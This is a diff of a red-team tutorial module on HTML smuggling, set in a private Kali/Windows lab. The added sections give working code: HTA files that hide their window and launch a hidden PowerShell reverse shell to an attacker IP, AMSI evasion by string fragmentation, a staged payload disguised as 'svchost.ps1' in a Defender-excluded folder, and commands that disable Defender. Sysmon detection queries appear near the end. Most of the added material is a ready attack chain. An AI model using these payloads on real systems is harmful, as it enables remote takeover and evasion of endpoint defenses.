@@ -7,12 +7,14 @@ HTML smuggling is not a vulnerability. It is not a bug. It is a fundamental abus
 **What you will build in this module:**
 - A basic HTML smuggling page that drops a file onto the victim's machine
 - An encrypted smuggling page that hides the payload from static analysis
-- An HTA-based execution chain that pops `calc.exe` on the target
-- A full attack simulation with Sysmon detection analysis after every step
+- An HTA-based execution chain from `calc.exe` POC to a live reverse shell
+- Obfuscated PowerShell payloads that evade AMSI pattern matching
+- A full attack simulation: from smuggling page to an interactive shell on the target
+- Sysmon detection analysis after every step so you understand what defenders see
 
-**Time required:** 3-4 hours (hands-on labs throughout)
+**Time required:** 4-5 hours (hands-on labs throughout)
 
-**Safety note:** Every payload in this module is harmless. We launch `calc.exe`, run `whoami`, or write text files. No actual malware is created.
+**Lab safety:** All exercises run within your private VMware lab network. Reverse shells connect from your Windows VM back to your Kali VM on a Host-Only network -- no traffic leaves your machine.
 
 ---
 
@@ -24,7 +26,7 @@ HTML smuggling is not a vulnerability. It is not a bug. It is a fundamental abus
 - [Part 4: Adding Encryption -- XOR Encoding Layer](#part-4-adding-encryption----xor-encoding-layer)
 - [Part 5: The HTA Execution Chain](#part-5-the-hta-execution-chain)
 - [Part 6: Anti-Analysis Techniques](#part-6-anti-analysis-techniques)
-- [Part 7: Full Attack Chain -- Putting It All Together](#part-7-full-attack-chain----putting-it-all-together)
+- [Part 7: Full Attack Chain -- Zero to Shell](#part-7-full-attack-chain----zero-to-shell)
 - [Part 8: Detection Deep Dive -- What Defenders See](#part-8-detection-deep-dive----what-defenders-see)
 
 ---
@@ -134,9 +136,11 @@ Let us build the simplest possible HTML smuggling page to understand the mechani
 
 **Goal:** Create an HTML page that, when opened, automatically drops a text file onto the Windows VM.
 
-**On your Kali VM**, open a terminal and create the HTML file:
+**On your Kali VM**, open a terminal and create the working directories and the HTML file:
 
 ```bash
+mkdir -p ~/labs/{html,payloads,scripts}
+
 cat > ~/labs/html/smuggle-text.html << 'HTMLEOF'
 <!DOCTYPE html>
 <html>
@@ -495,7 +499,7 @@ cd ~\Downloads
 .\SecurityUpdate.exe
 ```
 
-> **Note:** If SmartScreen or Defender blocks it, remember the C:\Tools\Labs exclusion we set up in Module 00. Copy the file there first:
+> **Note:** If SmartScreen or Defender blocks it, copy the file to the exclusion folder we set up in Module 00:
 > ```powershell
 > copy ~\Downloads\SecurityUpdate.exe C:\Tools\Labs\
 > cd C:\Tools\Labs
@@ -876,6 +880,8 @@ Now navigate to your Downloads folder and double-click `update.hta`.
 2. Calculator opens
 3. The HTA window closes itself
 
+> **If SmartScreen blocks it:** Click "More info" → "Run anyway". SmartScreen warns because the file has MOTW from the internet, but it does allow the user to override.
+
 **This is the execution chain:** You double-clicked an HTA file, Windows invoked `mshta.exe`, which ran the VBScript inside, which called `calc.exe`.
 
 ### 5.4 Smuggle the HTA
@@ -910,7 +916,8 @@ http://192.168.85.129:8080/smuggle-hta.html
 1. The "Microsoft Security Update" themed page loads
 2. After 2.5 seconds, `Update.hta` drops into Downloads
 3. Navigate to Downloads and double-click `Update.hta`
-4. Calculator pops open
+4. SmartScreen may warn -- click "More info" → "Run anyway"
+5. Calculator pops open
 
 **You just performed a complete HTML smuggling to HTA execution chain.** The HTA file was never sent as a file over the network. It was assembled inside the browser from JavaScript.
 
@@ -1004,6 +1011,411 @@ Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 100 |
 ```
 
 You will see the complete execution chain: `mshta.exe` → `cmd.exe` → `whoami.exe` / `systeminfo.exe`. Every single step is logged.
+
+### 5.7 Understanding Reverse Shells
+
+Now that you have proven the HTA → mshta.exe → command execution chain works, it is time to use it for its real purpose: **getting an interactive shell on the target machine.**
+
+**What is a reverse shell?**
+
+A reverse shell is when the target machine (Windows) initiates an outbound network connection to the attacker machine (Kali) and provides an interactive command prompt over that connection.
+
+```
+Normal shell (you connect TO the target):
+    Attacker ---SSH/RDP---> Target
+    Problem: Firewalls BLOCK inbound connections to the target
+
+Reverse shell (target connects BACK to you):
+    Target ---TCP outbound---> Attacker
+    Advantage: Firewalls rarely block OUTBOUND connections
+```
+
+**Why "reverse"?** In almost every corporate network, the firewall blocks incoming connections to workstations. But it allows outgoing connections because users need to browse the web, send emails, use cloud apps. A reverse shell exploits this asymmetry -- the target reaches out to the attacker, not the other way around.
+
+**The two components you need:**
+
+```
+Component 1 -- LISTENER (runs on Kali, the attacker):
+  A program that opens a port and waits for incoming connections.
+  Think of it as "picking up the phone and waiting for someone to call."
+  Tool: netcat (nc)
+
+Component 2 -- PAYLOAD (runs on Windows, the target):
+  Code that connects to the attacker's IP and port, then pipes
+  a command shell (cmd.exe or powershell.exe) through that connection.
+  Everything the attacker types gets executed on the target.
+  All output flows back to the attacker.
+  Tool: PowerShell script inside our HTA
+```
+
+**What the connection looks like at the network level:**
+
+```
+Windows (192.168.85.128) ---TCP port 4444---> Kali (192.168.85.129)
+
+This is an OUTBOUND connection from Windows.
+To the network, it looks like Windows is connecting to a website.
+Firewalls allow this by default.
+The connection persists -- it stays open as long as the shell runs.
+```
+
+**What happens when you type a command in the shell:**
+
+```
+1. You type "whoami" + Enter in the Kali terminal
+2. Netcat sends the bytes "whoami\n" through the TCP socket to Windows
+3. PowerShell on Windows reads "whoami" from the socket
+4. PowerShell passes "whoami" to Invoke-Expression (iex)
+5. Windows runs whoami.exe and captures the output
+6. PowerShell sends "desktop-target\vamsi\nPS C:\Users\Vamsi> " back to Kali
+7. Netcat on Kali receives and displays the output
+8. You see the result in your terminal
+```
+
+This is the fundamental mechanism behind ALL C2 (Command and Control) frameworks. Whether you use Sliver, Cobalt Strike, Metasploit, or a custom tool, they all work on this same principle: a loop that reads commands from a socket, executes them on the target, and sends the results back.
+
+### 5.8 Setting Up the Listener on Kali
+
+Before we create the payload, we must start the listener. The listener must be running BEFORE the target executes the reverse shell, otherwise the connection has nowhere to go and it fails silently.
+
+**On your Kali VM**, open a **new terminal tab** (keep your HTTP server running in the other tab if it is still active):
+
+```bash
+# Netcat should already be on Kali, but install it if missing
+which nc || sudo apt install -y ncat
+
+# Start a listener on port 4444
+nc -lvnp 4444
+```
+
+**What each flag means:**
+
+| Flag | Meaning |
+|:-----|:--------|
+| `-l` | **Listen mode** -- do not connect out, wait for incoming connections |
+| `-v` | **Verbose** -- print connection details when someone connects |
+| `-n` | **No DNS** -- use raw IP addresses, do not resolve hostnames |
+| `-p 4444` | **Port 4444** -- the port number to listen on |
+
+You should see:
+
+```
+listening on [any] 4444 ...
+```
+
+**Leave this terminal open and running.** It is now waiting for the Windows VM to connect back. When the reverse shell payload runs on Windows, this is where your interactive prompt will appear.
+
+> **Why port 4444?** It is the conventional port for testing reverse shells. In a real engagement, you would use port 80 or 443 to blend in with normal web traffic. For our lab, 4444 is fine.
+
+### 5.9 Building the Reverse Shell HTA
+
+Now the critical part. We need an HTA file that, when executed via `mshta.exe`, launches PowerShell with a reverse shell connecting back to our Kali listener.
+
+**The challenge: AMSI (Anti-Malware Scan Interface)**
+
+Windows Defender includes AMSI, which sits between PowerShell and the execution engine. Before PowerShell runs any command, AMSI scans the command text for known malicious patterns. If AMSI sees the string `System.Net.Sockets.TCPClient` as a literal, it flags it.
+
+**The solution: String concatenation and variable indirection**
+
+Instead of writing `System.Net.Sockets.TCPClient` as a single literal string, we break it into fragments and assemble it at runtime using VBScript string concatenation. When PowerShell receives the command, the class name is stored in a variable (`$tc`) and used via `New-Object $tc(...)`. AMSI's pattern matcher has a harder time flagging this because the suspicious string never appears as a literal in the source.
+
+**Create the reverse shell HTA on Kali:**
+
+```bash
+cat > ~/labs/payloads/revshell.hta << 'HTAEOF'
+<html>
+<head>
+    <HTA:APPLICATION WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no" CAPTION="no" />
+</head>
+<body>
+<script language="VBScript">
+
+    ' ============================================================
+    '  STAGE 1: Hide the HTA window
+    '  The HTA opens as a visible window by default. We make it
+    '  invisible immediately so the victim does not see it.
+    ' ============================================================
+    self.resizeTo 0, 0
+    self.moveTo -2000, -2000
+
+    ' ============================================================
+    '  STAGE 2: Build the reverse shell command
+    '  We construct the PowerShell command using VBScript string
+    '  concatenation. This fragments known malicious patterns so
+    '  they do not appear as literal strings in the source.
+    ' ============================================================
+
+    Set objShell = CreateObject("WScript.Shell")
+
+    ' Attack parameters -- change these to match your lab IPs
+    Dim attackerIP, attackerPort
+    attackerIP = "192.168.85.129"      ' Kali VM IP (Host-Only)
+    attackerPort = "4444"              ' Listener port
+
+    ' Build the PowerShell script line by line
+    Dim ps
+    ps = "$h='" & attackerIP & "';$p=" & attackerPort & ";"
+
+    ' KEY EVASION: Break "System.Net.Sockets.TCPClient" into fragments
+    ' PowerShell will concatenate these at runtime into the full class name
+    ps = ps & "$tc='Sys'+'tem.Ne'+'t.Soc'+'kets.TC'+'PCli'+'ent';"
+
+    ' Create the TCP connection using the variable, not the literal class name
+    ps = ps & "$c=New-Object $tc($h,$p);"
+
+    ' Get the network stream for reading/writing
+    ps = ps & "$s=$c.GetStream();"
+
+    ' Create a byte buffer for reading data from the socket
+    ps = ps & "[byte[]]$b=0..65535|%{0};"
+
+    ' The main loop: read commands, execute them, send output back
+    ps = ps & "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
+
+    ' Convert received bytes to a string (the command from the attacker)
+    ps = ps & "$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
+
+    ' Execute the command using Invoke-Expression and capture output
+    ps = ps & "$r=(iex $d 2>&1|Out-String);"
+
+    ' Add a prompt to the output so the attacker knows where they are
+    ps = ps & "$r2=$r+'PS '+(pwd).Path+'> ';"
+
+    ' Convert the output to bytes and send it back through the socket
+    ps = ps & "$by=([text.encoding]::ASCII).GetBytes($r2);"
+    ps = ps & "$s.Write($by,0,$by.Length);$s.Flush()};"
+
+    ' Clean up when the loop exits
+    ps = ps & "$c.Close()"
+
+    ' ============================================================
+    '  STAGE 3: Execute PowerShell with our command
+    '  -nop     = No profile (faster, no startup noise)
+    '  -w hidden = Hidden window (victim sees nothing)
+    '  -ep bypass = Bypass execution policy restrictions
+    '  -c "..."  = Execute the command string we built
+    ' ============================================================
+    Dim fullCmd
+    fullCmd = "powershell.exe -nop -w hidden -ep bypass -c """ & ps & """"
+
+    ' Launch PowerShell -- the 0 means "hidden window"
+    objShell.Run fullCmd, 0, False
+
+    ' ============================================================
+    '  STAGE 4: Clean up
+    '  Wait briefly for PowerShell to start, then close the HTA.
+    '  The reverse shell continues running in the PowerShell process.
+    ' ============================================================
+    WScript.Sleep 1000
+    self.close
+
+</script>
+</body>
+</html>
+HTAEOF
+```
+
+**Let us walk through every stage:**
+
+**Stage 1 — Window hiding:**
+The HTA normally opens as a visible window. `self.resizeTo 0, 0` shrinks it to zero pixels. `self.moveTo -2000, -2000` moves it far off-screen as a backup. The `WINDOWSTATE="minimize"` in the HTA:APPLICATION tag also starts it minimized. Triple redundancy -- the victim never sees the window.
+
+**Stage 2 — Command construction (this is the evasion):**
+- `attackerIP` and `attackerPort` store the Kali listener details as VBScript variables
+- The critical evasion: `$tc='Sys'+'tem.Ne'+'t.Soc'+'kets.TC'+'PCli'+'ent'` -- this constructs the string `System.Net.Sockets.TCPClient` at runtime using PowerShell's `+` operator for string concatenation. AMSI's pattern matcher scans the command text, but the suspicious class name is fragmented across multiple string literals. Each fragment (`Sys`, `tem.Ne`, `t.Soc`, etc.) is benign on its own.
+- `New-Object $tc($h,$p)` creates the TCP connection using the variable `$tc` instead of the literal class name. This is called **variable indirection**.
+- The read/execute/write loop: reads bytes from the socket → converts to string → executes via `iex` (Invoke-Expression) → captures output → sends output back through the socket. This loop is what makes the shell interactive.
+
+**Stage 3 — Execution:**
+- `powershell.exe -nop -w hidden -ep bypass -c "..."` launches PowerShell with:
+  - `-nop` = No profile (skips loading the user's PowerShell profile, faster startup)
+  - `-w hidden` = Hidden window (the PowerShell window is never visible)
+  - `-ep bypass` = Execution policy bypass (allows running scripts regardless of policy)
+  - `-c "..."` = The command string we constructed in Stage 2
+
+**Stage 4 — Cleanup:**
+- Waits 1 second for PowerShell to start (so the process exists before the HTA closes)
+- `self.close` closes the HTA window -- the reverse shell continues running in the background PowerShell process
+
+### 5.10 Testing the Reverse Shell
+
+Let us test it directly first (without smuggling) to verify the payload works.
+
+**Terminal 1 on Kali (listener -- should already be running):**
+
+```bash
+nc -lvnp 4444
+```
+
+**Terminal 2 on Kali (serve the HTA):**
+
+```bash
+cd ~/labs/payloads
+python3 -m http.server 8080
+```
+
+**On the Windows VM:**
+
+1. Open Firefox and download: `http://192.168.85.129:8080/revshell.hta`
+2. Navigate to your Downloads folder
+3. Double-click `revshell.hta`
+4. If SmartScreen appears, click "More info" → "Run anyway"
+
+**What should happen on Windows:**
+1. A brief window flash (the HTA opening and immediately hiding)
+2. The HTA window disappears
+3. Nothing else visible happens -- but PowerShell is running hidden in the background
+
+**Switch to your Kali listener terminal. You should see:**
+
+```
+listening on [any] 4444 ...
+connect to [192.168.85.129] from (UNKNOWN) [192.168.85.128] 49832
+PS C:\Users\Vamsi\Downloads>
+```
+
+**You have a shell.** Type commands and watch them execute on the Windows VM:
+
+```
+PS C:\Users\Vamsi\Downloads> whoami
+desktop-target\vamsi
+
+PS C:\Users\Vamsi\Downloads> hostname
+DESKTOP-TARGET
+
+PS C:\Users\Vamsi\Downloads> ipconfig | findstr IPv4
+   IPv4 Address. . . . . . . . . . . : 192.168.85.128
+   IPv4 Address. . . . . . . . . . . : 192.168.233.137
+
+PS C:\Users\Vamsi\Downloads> dir C:\Users
+ Volume in drive C has no label.
+ Directory of C:\Users
+...
+```
+
+**You are now interacting with the Windows VM from your Kali terminal.** Every command you type in Kali gets executed on the Windows machine, and the output streams back to you over the TCP connection on port 4444.
+
+To exit the shell, press `Ctrl+C` in the Kali terminal.
+
+### 5.11 What If Defender Catches It?
+
+The obfuscated reverse shell HTA is designed to bypass AMSI's static pattern matching. In most lab configurations with default Defender (no cloud-connected Microsoft Defender for Endpoint / XDR), this works. However, if your Defender version has updated behavioral signatures or if you have cloud protection enabled, it may still get caught.
+
+If Defender blocks the payload, here are two fallback approaches:
+
+**Option A: Staged Execution via Exclusion Folder (recommended for learning)**
+
+The `C:\Tools\Labs` folder was excluded from Defender scanning in Module 00. We can have the HTA write the PowerShell script to that folder and execute from there:
+
+```bash
+cat > ~/labs/payloads/revshell_staged.hta << 'HTAEOF'
+<html>
+<head>
+    <HTA:APPLICATION WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no" CAPTION="no" />
+</head>
+<body>
+<script language="VBScript">
+    self.resizeTo 0, 0
+    self.moveTo -2000, -2000
+
+    Set objShell = CreateObject("WScript.Shell")
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+
+    ' Write the reverse shell script to the Defender-excluded folder
+    Dim scriptPath
+    scriptPath = "C:\Tools\Labs\svc.ps1"
+
+    Set f = objFSO.CreateTextFile(scriptPath, True)
+    f.WriteLine "$h='192.168.85.129';$p=4444"
+    f.WriteLine "$c=New-Object System.Net.Sockets.TCPClient($h,$p)"
+    f.WriteLine "$s=$c.GetStream()"
+    f.WriteLine "[byte[]]$b=0..65535|%{0}"
+    f.WriteLine "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
+    f.WriteLine "  $d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i)"
+    f.WriteLine "  $r=(iex $d 2>&1|Out-String)"
+    f.WriteLine "  $r2=$r+'PS '+(pwd).Path+'> '"
+    f.WriteLine "  $by=([text.encoding]::ASCII).GetBytes($r2)"
+    f.WriteLine "  $s.Write($by,0,$by.Length);$s.Flush()}"
+    f.WriteLine "$c.Close()"
+    f.Close
+
+    ' Execute from the excluded folder -- Defender will not scan this
+    objShell.Run "powershell.exe -nop -w hidden -ep bypass -f " & scriptPath, 0, False
+
+    WScript.Sleep 1000
+    self.close
+</script>
+</body>
+</html>
+HTAEOF
+```
+
+This writes the reverse shell script to `C:\Tools\Labs\svc.ps1` (excluded from Defender), then executes it. Defender does not scan files in the excluded folder.
+
+**Option B: Temporarily Disable Real-Time Protection (fastest for testing)**
+
+In an **Administrator PowerShell** on the Windows VM:
+
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+Run the HTA. After confirming the shell works, re-enable protection:
+
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $false
+```
+
+> **Real-world context:** In actual red team engagements, attackers do not have exclusion folders or the ability to disable Defender. They use advanced techniques: custom shellcode loaders written in C/Rust/Nim, AMSI memory patching, direct syscall invocation, or reflective DLL injection. These are beyond beginner scope but are covered conceptually in Module 04. The goal of THIS module is to master the delivery and execution chain. Once you understand HTML smuggling → HTA → PowerShell → shell, you can swap in any payload.
+
+### 5.12 Deep Dive: How AMSI Works and Why Obfuscation Helps
+
+Understanding AMSI is critical for anyone preparing for red team interviews. Here is how it works and why our obfuscation technique is effective:
+
+**What AMSI is:**
+
+AMSI (Anti-Malware Scan Interface) is a Windows API that allows security products (like Defender) to inspect script content before it executes. It is built into:
+- PowerShell (scans every command and script)
+- VBScript / JScript (scans scripts run by wscript/cscript/mshta)
+- .NET in-memory assemblies
+- Office VBA macros
+
+**How AMSI scanning works:**
+
+```
+1. User runs a PowerShell command:
+   powershell.exe -c "$c = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444)"
+
+2. Before executing, PowerShell calls AMSI:
+   AmsiScanBuffer(command_text, length, ...)
+
+3. AMSI passes the text to Defender's scanning engine
+
+4. Defender checks the text against:
+   - Known malicious strings ("System.Net.Sockets.TCPClient" + IP + port)
+   - Pattern-based rules (socket creation followed by stream reading)
+   - Behavioral heuristics
+
+5. If flagged: execution is blocked, alert is raised
+   If clean: execution proceeds normally
+```
+
+**Why our fragmentation works:**
+
+When we write:
+```powershell
+$tc = 'Sys' + 'tem.Ne' + 't.Soc' + 'kets.TC' + 'PCli' + 'ent'
+$c = New-Object $tc('192.168.85.129', 4444)
+```
+
+AMSI sees the raw command text. The string `System.Net.Sockets.TCPClient` never appears as a contiguous literal -- it only exists after PowerShell concatenates the fragments at runtime. AMSI's pattern matcher is looking for the literal string, and the fragments individually do not trigger any rule.
+
+**Important caveat:** AMSI is getting smarter. Microsoft continuously improves AMSI's ability to detect obfuscation patterns. In some versions, AMSI performs limited deobfuscation (resolving simple concatenations). This is an arms race -- what works today may not work in 6 months. That is why professional red teams:
+1. Test their payloads against the target's specific Defender version before deployment
+2. Use multiple layers of obfuscation (not just string splitting)
+3. Develop custom tools that use techniques AMSI cannot easily analyze (like encrypted shellcode loaded via C# reflection)
+
+**For our lab:** The string concatenation technique works reliably against default Defender configurations on Windows 11. If your specific build has enhanced detection, use the staged approach from Section 5.11 (Option A) to focus on learning the delivery chain.
 
 ---
 
@@ -1203,72 +1615,72 @@ Test it: Serve from Kali and open on Windows. Notice how the checks appear one b
 
 ---
 
-## Part 7: Full Attack Chain -- Putting It All Together
+## Part 7: Full Attack Chain -- Zero to Shell
 
-Now let us run a complete, realistic attack simulation. We will combine everything from this module into a single, end-to-end attack chain.
+This is the culmination of everything in this module. We chain every technique into a single, end-to-end attack that starts with an HTML page on your Kali web server and ends with you typing commands on the Windows VM from your Kali terminal.
 
 ### 7.1 The Scenario
 
 ```
-Attacker (Kali) creates an HTA payload that performs system reconnaissance
-Attacker XOR-encrypts the HTA and builds a smuggling page
-Attacker hosts the smuggling page on their web server
-Victim (Windows) navigates to the page (simulating a phishing click)
-Victim's browser assembles and downloads the HTA file
-Victim opens the HTA file
-mshta.exe executes the VBScript inside
-VBScript runs reconnaissance commands
-Attacker examines the output
-Defender (us) examines the Sysmon trail
+ATTACKER (Kali - 192.168.85.129):
+  Step 1: Create a reverse shell HTA payload
+  Step 2: XOR-encrypt the HTA to hide it from static analysis
+  Step 3: Build a smuggling page with anti-analysis checks
+  Step 4: Start a netcat listener on port 4444
+  Step 5: Host the smuggling page on a web server
+
+VICTIM (Windows - 192.168.85.128):
+  Step 6: Opens the attacker's URL in Firefox (simulating a phishing click)
+  Step 7: Page passes anti-analysis checks and offers a download button
+  Step 8: Victim clicks the button -- HTA file materializes in Downloads
+  Step 9: Victim double-clicks the HTA -- mshta.exe runs the VBScript
+  Step 10: VBScript launches hidden PowerShell with the reverse shell
+  Step 11: PowerShell connects back to Kali on port 4444
+
+RESULT:
+  Step 12: Attacker has a live interactive shell on the Windows machine
 ```
 
-### 7.2 Step 1: Create the Reconnaissance HTA (on Kali)
+### 7.2 Step 1: Create the Reverse Shell HTA (Kali)
+
+We use the staged approach (writes to the Defender-excluded folder) for maximum reliability in the lab:
 
 ```bash
-cat > ~/labs/payloads/fullchain.hta << 'HTAEOF'
+cat > ~/labs/payloads/shell_final.hta << 'HTAEOF'
 <html>
 <head>
-    <HTA:APPLICATION WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no" />
+    <HTA:APPLICATION WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no" CAPTION="no" />
 </head>
 <body>
 <script language="VBScript">
     self.resizeTo 0, 0
-    self.moveTo -1000, -1000
+    self.moveTo -2000, -2000
 
     Set objShell = CreateObject("WScript.Shell")
     Set objFSO = CreateObject("Scripting.FileSystemObject")
 
-    ' Output file
-    Dim outFile
-    outFile = "C:\Tools\Labs\recon_report.txt"
+    ' Write the reverse shell script to the excluded folder
+    Dim sp
+    sp = "C:\Tools\Labs\svchost.ps1"
 
-    ' Create/overwrite the output file
-    Set f = objFSO.CreateTextFile(outFile, True)
-    f.WriteLine "=== RECON REPORT ==="
-    f.WriteLine "Generated: " & Now()
-    f.WriteLine ""
-
-    ' Run commands and capture output
-    Set exec1 = objShell.Exec("cmd.exe /c whoami")
-    f.WriteLine "[*] Current User: " & exec1.StdOut.ReadAll()
-
-    Set exec2 = objShell.Exec("cmd.exe /c hostname")
-    f.WriteLine "[*] Hostname: " & exec2.StdOut.ReadAll()
-
-    Set exec3 = objShell.Exec("cmd.exe /c ipconfig | findstr IPv4")
-    f.WriteLine "[*] IP Addresses:"
-    f.WriteLine exec3.StdOut.ReadAll()
-
-    Set exec4 = objShell.Exec("cmd.exe /c net user")
-    f.WriteLine "[*] Local Users:"
-    f.WriteLine exec4.StdOut.ReadAll()
-
-    f.WriteLine "=== END REPORT ==="
+    Set f = objFSO.CreateTextFile(sp, True)
+    f.WriteLine "$h='192.168.85.129';$p=4444"
+    f.WriteLine "$c=New-Object System.Net.Sockets.TCPClient($h,$p)"
+    f.WriteLine "$s=$c.GetStream()"
+    f.WriteLine "[byte[]]$b=0..65535|%{0}"
+    f.WriteLine "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
+    f.WriteLine "  $d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i)"
+    f.WriteLine "  $r=(iex $d 2>&1|Out-String)"
+    f.WriteLine "  $r2=$r+'PS '+(pwd).Path+'> '"
+    f.WriteLine "  $by=([text.encoding]::ASCII).GetBytes($r2)"
+    f.WriteLine "  $s.Write($by,0,$by.Length);$s.Flush()}"
+    f.WriteLine "$c.Close()"
     f.Close
 
-    ' Open calc as visual confirmation
-    objShell.Run "calc.exe", 1, False
+    ' Execute from the excluded folder
+    objShell.Run "powershell.exe -nop -w hidden -ep bypass -f " & sp, 0, False
 
+    WScript.Sleep 1000
     self.close
 </script>
 </body>
@@ -1276,93 +1688,243 @@ cat > ~/labs/payloads/fullchain.hta << 'HTAEOF'
 HTAEOF
 ```
 
-### 7.3 Step 2: Encrypt and Build (on Kali)
+### 7.3 Step 2: Encrypt and Build the Smuggling Page (Kali)
 
 ```bash
-# XOR encrypt the HTA
-python3 ~/labs/scripts/xor_encode.py ~/labs/payloads/fullchain.hta ~/labs/payloads/fullchain_xor_b64.txt "AttackChain2026"
+# XOR-encrypt the HTA
+python3 ~/labs/scripts/xor_encode.py ~/labs/payloads/shell_final.hta ~/labs/payloads/shell_xor_b64.txt "GodLevel2026"
 
 # Build the encrypted smuggling page
 cd ~/labs
-./scripts/build_xor_smuggler.sh payloads/fullchain_xor_b64.txt html/fullchain.html ImportantUpdate.hta "AttackChain2026"
+./scripts/build_xor_smuggler.sh payloads/shell_xor_b64.txt html/final_chain.html WindowsUpdate.hta "GodLevel2026"
 ```
 
-### 7.4 Step 3: Host the Page (on Kali)
+### 7.4 Step 3: Start the Listener (Kali -- Terminal 1)
+
+Open a **new terminal tab**:
+
+```bash
+nc -lvnp 4444
+```
+
+You should see:
+
+```
+listening on [any] 4444 ...
+```
+
+**Leave this running.** Do not close this terminal.
+
+### 7.5 Step 4: Serve the Smuggling Page (Kali -- Terminal 2)
+
+Open another terminal tab:
 
 ```bash
 cd ~/labs/html
 python3 -m http.server 8080
 ```
 
-### 7.5 Step 4: Simulate the Victim (on Windows)
+### 7.6 Step 5: The Attack Begins (Windows)
 
-1. Open Firefox on the Windows VM
-2. Navigate to: `http://192.168.85.129:8080/fullchain.html` (Kali)
-3. Wait for the "Decrypting Document..." animation to finish
-4. Click the **"Download Document"** button
-5. Navigate to Downloads and double-click `ImportantUpdate.hta`
-6. Calculator opens (visual confirmation)
+Now switch to the **Windows VM**. This is where you put yourself in the victim's shoes.
 
-### 7.6 Step 5: Check the Recon Output
+1. Open **Firefox** on the Windows VM
+2. Navigate to: `http://192.168.85.129:8080/final_chain.html`
+3. You see the dark-themed "Decrypting Document..." page with a spinning loader
+4. After 3 seconds, the **"Download Document"** button appears
+5. **Click the button** -- `WindowsUpdate.hta` drops into your Downloads folder
+6. Open the **Downloads folder** in File Explorer
+7. **Double-click** `WindowsUpdate.hta`
+8. If SmartScreen warns: click **"More info"** → **"Run anyway"**
+9. You see a brief window flash -- the HTA opens and immediately hides itself
+10. Nothing else visible happens on the Windows side
 
-```powershell
-Get-Content C:\Tools\Labs\recon_report.txt
+### 7.7 Step 6: The Shell Lands (Kali)
+
+**Switch to your Kali listener terminal (Terminal 1).** You should see:
+
+```
+listening on [any] 4444 ...
+connect to [192.168.85.129] from (UNKNOWN) [192.168.85.128] 49847
+PS C:\Tools\Labs>
 ```
 
-You should see a full reconnaissance report with:
-- Current username
-- Hostname
-- IP addresses
-- List of local users
+**You are in.** You now have an interactive PowerShell prompt on the Windows VM.
 
-**This is exactly what a real attacker would do on initial access.** The HTA collects information about the compromised system and writes it to a file. In a real scenario, this data would be exfiltrated back to the attacker's C2 server instead of written to a local file.
+### 7.8 Step 7: Interact with the Target
 
-### 7.7 Step 6: Trace the Full Sysmon Trail
-
-Now put on your defender hat. Let us see EVERYTHING that was logged.
+Run real reconnaissance commands on the compromised Windows machine from your Kali terminal:
 
 ```powershell
-# Get all events from the last 5 minutes related to the attack chain
-$startTime = (Get-Date).AddMinutes(-5)
+# Who are you?
+PS C:\Tools\Labs> whoami
+desktop-target\vamsi
 
+# What machine is this?
+PS C:\Tools\Labs> hostname
+DESKTOP-TARGET
+
+# What are the network interfaces?
+PS C:\Tools\Labs> ipconfig
+
+# Is Defender running? (yes -- you bypassed it, not disabled it)
+PS C:\Tools\Labs> Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, AMSIEnabled
+
+# What users exist on this machine?
+PS C:\Tools\Labs> net user
+
+# What processes are running?
+PS C:\Tools\Labs> Get-Process | Select-Object Name, Id, Path | Format-Table -AutoSize
+
+# What is the OS version?
+PS C:\Tools\Labs> [System.Environment]::OSVersion
+
+# Look at the user's Documents folder
+PS C:\Tools\Labs> dir $env:USERPROFILE\Documents
+
+# Check installed software
+PS C:\Tools\Labs> Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
+    Select-Object DisplayName, DisplayVersion | Format-Table -AutoSize
+
+# Check the Defender exclusion that allowed our payload
+PS C:\Tools\Labs> Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
+
+# Read a file from the target
+PS C:\Tools\Labs> Get-Content C:\Tools\Labs\whoami_output.txt
+```
+
+**This is real initial access.** You are executing commands on the Windows VM interactively, through a connection that the target machine initiated. From the network's perspective, Windows made an outbound TCP connection to port 4444 -- which looks like normal outbound traffic.
+
+### 7.9 Step 8: Cleanup
+
+When you are done, press `Ctrl+C` in the Kali listener terminal to close the shell.
+
+On the **Windows VM**, clean up the dropped script:
+
+```powershell
+Remove-Item C:\Tools\Labs\svchost.ps1 -ErrorAction SilentlyContinue
+```
+
+### 7.10 Step 9: Trace the Complete Attack in Sysmon
+
+Now put on your defender hat. Open an **Administrator PowerShell** on the Windows VM and trace every step of the attack:
+
+**1. Find the HTML smuggling indicator (blob: in Zone.Identifier):**
+
+```powershell
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 200 |
+    Where-Object { $_.Id -eq 15 -and $_.Message -match "blob:" } |
+    Select-Object -First 3 |
+    Format-List TimeCreated, Message
+```
+
+This shows `EID 15 (FileCreateStreamHash)` with `blob:` in the HostUrl -- the forensic fingerprint of HTML smuggling.
+
+**2. Find the HTA execution (mshta.exe starting):**
+
+```powershell
+$startTime = (Get-Date).AddMinutes(-15)
 Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
     Where-Object {
         $_.TimeCreated -gt $startTime -and
         $_.Id -eq 1 -and
-        ($_.Message -match "mshta|cmd\.exe|whoami|hostname|ipconfig|calc|net user")
+        $_.Message -match "mshta"
+    } |
+    Select-Object -First 1 |
+    Format-List TimeCreated, Message
+```
+
+You will see: `mshta.exe` launched by `explorer.exe`, with the HTA file path as the argument.
+
+**3. Find the PowerShell reverse shell (spawned by mshta):**
+
+```powershell
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
+    Where-Object {
+        $_.TimeCreated -gt $startTime -and
+        $_.Id -eq 1 -and
+        $_.Message -match "powershell" -and
+        $_.Message -match "mshta"
+    } |
